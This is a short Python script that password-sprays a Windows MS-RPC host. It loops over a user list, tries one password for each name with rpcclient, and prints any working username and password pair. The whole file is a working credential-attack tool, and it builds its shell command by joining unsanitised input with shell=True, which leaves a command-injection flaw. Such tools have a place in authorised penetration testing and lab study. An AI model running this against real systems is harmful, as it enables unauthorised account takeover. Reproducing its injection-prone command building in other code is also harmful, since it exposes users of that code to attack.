import subprocess
import sys

if len(sys.argv) != 4:
    print("Usage: python3 passwordspraymsrpc.py <password> <IP> <pathtouserlist>")
    sys.exit()

password=sys.argv[1]
ip=sys.argv[2]
wordlist=open(sys.argv[3],"r").readlines()
for user in wordlist:
    user=user.strip()
    x=subprocess.Popen("rpcclient -U "+user+"%"+password+" "+ip+" -c srvinfo", shell=True, stdout=subprocess.PIPE)
    result = x.communicate()[0].decode('utf-8')
    if "NT_STATUS_LOGON_FAILURE" in result:
       pass
    elif "platform_id" in result:
       print("Success with: "+user+":"+password)
       sys.exit()
print("[-] No results found for user: "+user+" and wordlist: "+sys.argv[3])
